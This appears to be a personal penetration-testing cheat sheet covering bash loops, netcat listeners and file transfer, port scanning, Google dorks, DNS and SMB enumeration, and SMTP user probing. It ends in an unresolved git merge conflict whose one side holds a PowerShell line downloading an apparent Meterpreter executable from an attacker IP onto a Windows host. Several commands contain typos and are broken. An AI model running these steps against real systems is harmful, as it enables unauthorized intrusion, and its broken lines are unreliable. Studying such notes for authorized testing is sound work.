#----- Bash -----#

## For loop
for ip in $(cat file.txt); do echo $ip; done

## Create directory structure for each IP in file.txt
for ip in $(cat alive.txt); do mkdir -p "$ip"/{findings,notes,pillage,remote-enum,root-in-10-steps-or-less}; done

## Parse file data
cut -d'.' -f1 filename.txt |sort -u



# Wordlist locations
/usr/share 


#----- Linux Commands -----#
### Process Running
netstat -antp | grep sshd

### Start HTTP Service (/var/www)
service apache2 start

### Service Persistence on reboot 
update-rc.d ssh enable
update-rc.d apache2 enable


#----- NetCat -----#
### Connect using netcat
nc -nv IPaddress port

### Netcat listner
nv -nlvp 4444

## Netcat transfer

### Receiver
nc -nlvp 4444 > incoming.txt

### Sender
nc -nv IPaddress port </path/of/file.txt

### SIMPLE TCP & UDP PORT SCAN
nc -nvv -w 1 -z IPADDRESS START_PORT-END_PORT
nc -unvv -w 1 -z IPADDRESS START_PORT-END_PORT


#----- NCat (Supports encrypted tunnel) -----#
### Listener
ncat -nlvp IPAddress 4444

### Connect
ncat -v IPAddress 4444 --ssl

#----- Google Hacking CMD -----#
### Search specific site
Site:"microsoft.com"

### Exclude results from www.microsoft.com
Site:"microsoft.com" -site:"www.microsoft.com

### Search specific file type
site:"microsoft.com: filetype:ppt

intitle:"VNC viewer for java"

inurl:"/specific/url/"

#----- DNS ENUMBERATION -----#
### name server
host -t ns domain.com

### mail server
host -t mx domain.com

### Forward lookup (domain to IP)
for subdomain in $(list.txt);do nslookup $subdomain.DOMAIN.com|grep "Address: " | cut -d " " -f1,4;done

### Reverse DNS lookup (IP range to doamin)
for ip in (seq 1 255); do host 10.10.10.$ip |grep "DOMAIN" |cut -d" " -f1,5; done

### ZONE TRANSFERS (Get all domains in DNS)
host -l ns DOMAIN.COM

## BUILT TOOLS
DNSRECON, DNSENUM


#----- PORT SCANNING -----#
SYN SCANNING (half scan) 

### NMAP SCRIPTS
/usr/share/nmap/scripts

### PING SWEEP
nmap -sn 192.168.1.1/24

### NMAP GOOD ARGUMENTS
-oG = Grepable output

--reason: Display the reason a port is in a particular state

--top--ports (nmap -sT --top-ports 20 IPAddress -oG filename.txt)

-sV = Banner grabbing

-O = OS fingerprinting

-A: Enable OS detection, version detection, script scanning, and traceroute

--open = only display results of open ports


#----- SMB -----#

### Identify smb or netbios services
nbtscan IPADDRESS/24

PORTS 139,445

### Login to SMB with null session (click enter on password)
rpcclient -U "" IPADDRESS

### commands to run after connecting
srvinfo
enumdomusers
getdompwinfo

## Tools to use 
enum4linux -v IPADDRESS

nmap -p 139,445 --script smb-enum-users.nse IPADDRESS -oG smb-enum.txt
nmap -p 139,445 --script smb-vuln* IPADDRESS -oG smb-enum.txt

#----- SMTP -----#

PORT 25

#Connect via Netcat
nc -nv 10.10.10.51 25
VRFY bob


<<<<<<< HEAD
for user in $(cat users.txt); do nc -nv IPADDRESS 25; VRFY $user; done
=======
#----- Transferring Files from Linux to Windows -----#
### Python Webserver 
python -m SimpleHTTPServer

### Transfer to Windows with no broswer
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\name\Desktop\met8888.exe')"

>>>>>>> 13e2e1d7c5bf48c2cc040d1732e2b8118184a462

